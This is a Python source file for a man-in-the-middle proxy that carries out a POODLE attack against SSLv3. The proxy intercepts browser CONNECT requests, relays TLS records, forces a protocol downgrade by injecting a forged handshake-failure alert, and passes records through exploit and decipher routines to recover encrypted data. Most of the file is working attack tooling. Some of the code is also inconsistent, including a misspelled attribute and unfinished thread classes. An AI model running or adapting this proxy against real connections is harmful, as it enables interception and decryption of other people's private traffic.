import binascii
import socketserver

from scapy.all import *

import color_def
import poodle as pd

"""
    The proxy respond to the CONNECT packet then just forward SSL packet to the server
    or the client. When active mode is enabled, the proxy alter the encrypted data send
    to the server
"""


class ProxyTCPHandler(socketserver.BaseRequestHandler):
    server_ip = None
    server_port = None
    server_domain = None
    previous_domain = None

    # def setup(self, server_ip, server_port, poodle, traffic, server_domain, previous_domain):
    #     self.server_ip = server_ip
    #     self.serverPort = server_port;
    #     self.poodle = poodle
    #     self.traffic = traffic
    #     self.server_domain = server_domain
    #     self.previous_domain = previous_domain

    @staticmethod
    def clear():
        ProxyTCPHandler.server_ip = None
        ProxyTCPHandler.server_port = None
        ProxyTCPHandler.server_domain = None
        ProxyTCPHandler.previous_domain = None

    @staticmethod
    def set_configurations(server_ip, server_port, server_domain, previous_domain):
        ProxyTCPHandler.server_ip = server_ip
        ProxyTCPHandler.server_port = server_port
        ProxyTCPHandler.server_domain = server_domain
        ProxyTCPHandler.previous_domain = previous_domain

    def setup(self):
        self.poodle = pd.Poodle()

        self.traffic = pd.Traffic()
        self.traffic.info_traffic(self.traffic.protocol_current_color, self.traffic.protocol_current,
                                  color_def.bcolors.ORANGE, '  search   ')

    def handle_web(self, socket_server, request):
        while True:
            data = socket_server.recv(10240)
            time.sleep(3)
            print("received from website: ", data)
            request.send(data)

    def handle_client(self, request, socket_server):
        while True:
            data = request.recv(10240)
            time.sleep(3)
            print("received from browser: ", data)
            socket_server.send(data)

    def handle(self):
        poodle = self.poodle
        traffic = self.traffic
        columns = 80

        print("handle call");

        # Connection to the secure server
        socket_server = socket.create_connection((ProxyTCPHandler.server_ip, ProxyTCPHandler.server_port))
        print('Proxy is launched on {!r} port {}'.format("127.0.0.1", 9999))
        # input allow us to monitor the socket of the client and the server
        # browser_handler = BrowserHandler(self.request, socket_server, poodle, traffic)
        # browser_handler.start();
        #
        # web_handler = WebHandler(self.request, socket_server, poodle, traffic, columns)
        # web_handler.start();

        threading.Thread(target=self.handle_web, args=(socket_server, self.request)).start();
        threading.Thread(target=self.handle_client, args=(self.request, socket_server)).start();

        time.sleep(100000)

class BrowserHandler(Thread):
    def __init__(self, request, socket_server, poodle, traffic):
        self.request = request
        self.socket_server = socket_server
        self.poodle = poodle
        self.traffic = traffic

    def run(self):
        poodle = self.poodle
        traffic = self.traffic
        socket_server = self.socket_server

        connect = True
        while True:
            if connect:
                """
                    This block of code is only ran once.
                    It attempts to check if this is an initial connection message and if it is, 
                    it pretends that the connection was successfully established.
                """
                # print('Client -> proxy')
                data = self.request.recv(1024)
                print("Received: " + str(data));
                # print("Received: " + data.decode("utf-8"));
                connect = False
                # data = "HTTP/1.0 200 Connection established\r\n\r\n"
                # self.request.send(data.encode())
                if 'CONNECT' in str(data):
                    if ProxyTCPHandler.server_domain in str(data):
                        data = "HTTP/1.1 200 Connection established\r\n\r\n"
                        self.request.send(data.encode())
                        break
                    elif ProxyTCPHandler.previous_domain in str(data):
                        # Tell client to move on
                        print("Previous domain detected")
                        is_valid = False
                        self.request.close()
                        return
                    elif 'clients2.google.com' in str(data):
                        # Fix for Chrome's update checker
                        data = 'HTTP/1.1 200 Connection established\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><gupdate xmlns="http://www.google.com/update2/response" protocol="2.0" server="prod"><daystart elapsed_days="4371" elapsed_seconds="3642"/><app appid="hfnkpimlhhgieaddgfemjhofmfblmnib" cohort="1:jcl:" cohortname="Auto" status="ok"><updatecheck status="noupdate"/></app><app appid="hnimpnehoodheedghdeeijklkeaacbdc" cohort="" cohortname="" status="ok"><updatecheck status="noupdate"/></app><app appid="npdjjkjlcidkjlamlmmdelcjbcpdjocm" cohort="1:i2r:" cohortname="Win" status="ok"><updatecheck codebase="http://www.google.com/dl/release2/chrome_component/ANo3o4NBTqM-_101.3.33.21/101.3.33.21_win_ChromeRecovery.crx2" fp="2.101.3.33.21" status="ok"/></app></gupdate>'
                        self.request.send(data.encode())
                        print("Update check found")
                        is_valid = False;
                        if poodle.applyBlock:
                            self.request.close()
                        return
                    elif '47a654ab3ed56e097ec614d87f642f8f5375c7775f41b65fbac7a0575eec12fc' in str(data):
                        # move on
                        print(
                            "Attack block received ===================================================================================\n")
                        poodle.find_block_length = False
                        poodle.length_block_found = True
                        poodle.downgrade = False
                        traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current,
                                             color_def.bcolors.MAJ, '  active   ')
                        data = "HTTP/1.1 200 Connection established\r\n\r\n"
                        self.request.send(data.encode())
                        break
                    elif 'internalerror' in str(data):
                        # move on
                        print(
                            "Received internal error ===================================================================================\n")
                        poodle.find_block_length = False
                        poodle.length_block_found = True
                        poodle.downgrade = False
                        traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current,
                                             color_def.bcolors.MAJ, '  active   ')
                        data = "HTTP/1.1 507 Insufficient Storage\r\n\r\n"
                        self.request.send(data.encode())
                        break
                    else:  # Some other domain, don't give it to them.
                        data = "HTTP/1.1 404 Not Found\r\n\r\n"
                        self.request.send(data.encode())
                        print("isValid = false")
                        is_valid = False
                        if poodle.applyBlock:
                            self.request.close()
                        return
            else:
                # print('Client -> proxy -> server')
                try:
                    # Attempt to decode the header of the message.
                    ssl_header = self.request.recv(5)
                    print("Header: " + str(ssl_header))
                except struct.error as err:
                    print("Header error");
                    break
                if ssl_header == '':
                    print("empty header");
                    running = False
                    break
                try:
                    # Unpack header. > = define data as big endian. B = grab unsigned char. H = grab unsigned short.
                    (content_type, version, length) = struct.unpack('>BHH', ssl_header)
                    print("client -> server", str(content_type), str(version), str(length))
                    try:
                        # Cast version based on version (array notations defined above under class Traffic) traffic.protocol_all is the array.
                        traffic.protocol_current = traffic.protocol_all[version][0]
                        traffic.protocol_current_color = traffic.protocol_all[version][1]
                        if int(version) != 768:
                            print("Warning: Protocol not SSLV3!")
                            if traffic.protocol_downgrade == 0 and poodle.autoDowngrade == True:
                                print("Attempting to automatically downgrade...")
                                traffic.protocol_downgrade = 1
                    except KeyError as err:
                        # avoid error if the protocol is SSLv2.0
                        traffic.protocol_current = traffic.protocol_all[length][0]
                        traffic.protocol_current_color = traffic.protocol_all[length][1]
                except struct.error as err:
                    # avoid error in chrome browser
                    return
                if traffic.protocol_downgrade == 1 and content_type == 23:
                    traffic.info_traffic(traffic.protocol_current_color, traffic.protocol_current,
                                         color_def.bcolors.YELLOW, ' downgrade ')
                    traffic.protocol_downgrade = 0
                data = self.request.recv(length)
                (data, ssl_header, error) = poodle.exploit(content_type, version, length, data, self.request)
                if error:
                    stuff = 'HTTP/1.1 200 Connection established\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><gupdate xmlns="http://www.google.com/update2/response" protocol="2.0" server="prod"><daystart elapsed_days="4371" elapsed_seconds="3642"/><app appid="hfnkpimlhhgieaddgfemjhofmfblmnib" cohort="1:jcl:" cohortname="Auto" status="ok"><updatecheck status="noupdate"/></app><app appid="hnimpnehoodheedghdeeijklkeaacbdc" cohort="" cohortname="" status="ok"><updatecheck status="noupdate"/></app><app appid="npdjjkjlcidkjlamlmmdelcjbcpdjocm" cohort="1:i2r:" cohortname="Win" status="ok"><updatecheck codebase="http://www.google.com/dl/release2/chrome_component/ANo3o4NBTqM-_101.3.33.21/101.3.33.21_win_ChromeRecovery.crx2" fp="2.101.3.33.21" status="ok"/></app></gupdate>'
                    self.request.send(stuff.encode())
                data_full = ssl_header + data
                # we send data to the server
                poodle.packet_count += 1
                socket_server.send(data_full)


class WebHandler(Thread):
    def __init__(self, request, socket_server, poodle, traffic, columns):
        self.request = request
        self.socket_server = socket_server
        self.poodle = poodle
        self.traffic = traffic
        self.columns = columns

    def run(self):
        poodle = self.poodle
        traffic = self.traffic
        columns = self.columns
        while True:
            # try:
            data = self.socket_server.recv(1024)
            # except socket.error as err:
            #     break
            # print('Server -> proxy -> client')
            # print("Received: " + str(data));
            if len(data) == 0:
                running = False
                break
            (content_type, version, length) = struct.unpack('>BHH', data[0:5])

            if poodle.data_alterede:
                poodle.count = poodle.count + 1
                if content_type == 23:
                    # 23 -> Application data (no HMAC error)
                    poodle.decipher()
                    poodle.count = 0
                # elif content_type == 21:
                # 21 -> HMAC error
                poodle.data_altered = False
            poodle.packet_count += 1
            if poodle.find_block_length == False and poodle.length_block_found == False and not poodle.downgrade:
                sys.stdout.write("\r[OK] -> packed send and receive %3s %s %s" % (
                    poodle.packet_count, ''.rjust(int(columns) - 56),
                    traffic.protocol_current_color + traffic.protocol_current + color_def.bcolors.BLUE + color_def.bcolors.BOLD + ' passive  ' + color_def.bcolors.ENDC))
                # cursor at the end, tssss
                sys.stdout.write("\r[OK] -> packed send and receive %3s" % (poodle.packet_count))
                sys.stdout.flush()
            if poodle.downgrade and traffic.protocol_current != ' SSLv3.0 ' and traffic.protocol_downgrade == 0:
                print("Sending handshake failure")
                self.request.send(binascii.unhexlify("15030000020228"))
                traffic.protocol_downgrade = 1
                poodle.downgrade = False
            else:
                # we send data to the client
                self.request.send(data)


class MyTCPHandler(socketserver.BaseRequestHandler):
    """
    The request handler class for our server.

    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the
    client.
    """

    def handle(self):
        # self.request is the TCP socket connected to the client
        print("server: ", self.server.server_address, "to client ", self.client_address)
        self.data = self.request.recv(10240).strip()
        # print("{} wrote:".format(self.client_address[0]))
        print(self.data)
        time.sleep(5)
        # just send back the same data, but upper-cased
        self.request.sendall(self.data)
